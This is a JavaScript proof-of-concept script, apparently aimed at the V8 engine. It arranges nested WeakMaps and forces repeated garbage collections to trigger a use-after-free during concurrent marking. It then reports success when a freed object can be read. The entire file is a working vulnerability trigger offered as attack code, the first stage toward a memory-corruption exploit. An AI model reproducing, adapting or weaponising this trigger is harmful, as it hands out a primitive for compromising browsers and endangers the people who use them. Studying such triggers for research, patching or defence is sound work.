let wm = new WeakMap();
let k0 = {k: 0};


/**
 * Concurrent-Marking is garbge collection that distirbutes
 * the marking jobs throughout many threads.
 * In order to make our trigger work with this we might just
 * need to allocate a lot of trash.
*/
///*
let garbageMap = new WeakMap();
function trashGc() {
    for (let i = 0; i < 500; i++)
        garbageMap.set(k0, {k: i});
}
//*/

function trigger() {
    // stage1 //
    let v0 = {v: 0};
    let k1 = {k: 1};
    //let v1 = {v: 1};
    let s2wm = new WeakMap();
    //let v1 = [s2wm];
    let v1 = s2wm;
    let k2 = {k: 2};
    let v3 = [k1];
    // TRICK!
    // k1 pointer is saved as
    // an element of an array
    // which will get marked 
    // we could just get k1 by
    // accessing index 0!!
    // --------------------- //

    let v2 = {v: 2};
    let k3 = {k: 3};

    let innerWm = new WeakMap();

    wm.set(k1, v1);
    wm.set(v0, innerWm);
    wm.set(k0, v0);
    
    innerWm.set(k2, v3);
    innerWm.set(k0, k2);


    // stage2 //
    let s2innerWm = new WeakMap();
    let s2v0 = {v: 00};
    let s2k1 = {k: 11};
    let s2v1 = [1.2];
    let s2k2 = {k: 22};
    let s2v3 = [s2k1];

    s2wm.set(s2k1, s2v1);
    s2wm.set(s2v0, s2innerWm);
    s2wm.set(k0, s2v0);
    
    s2innerWm.set(s2k2, s2v3);
    s2innerWm.set(k0, s2k2);
    
    // --------------------- //

}

function getUafObject(wm) {
    let innerWm = wm.get(wm.get(k0));
    let s2wm = wm.get( // v1
        innerWm.get( // v3
            innerWm.get(k0) // k2
        )[0]
    );
    
    let s2innerWm = s2wm.get(s2wm.get(k0));
    return s2wm.get( // s2v1
        s2innerWm.get( // s2v3
            s2innerWm.get(k0) // s2k2
        )[0]
    );
}


console.log("[+] Starting trigger");

for (let i = 0; i < 99999; i++) {
    console.log("[*] " + i + ".");
    garbageMap.set(k0, {k: i});
    %CollectGarbage(null)
    trigger();
    %CollectGarbage(null)

    let uaf_object = getUafObject(wm);
    if (uaf_object != 1.2) {
        console.log("[+] Trigger Successful");
        console.log("[*] Iteration " + i + ".");
        console.log("[+] Object value: ");
        console.log(uaf_object);
        break;
    }
}
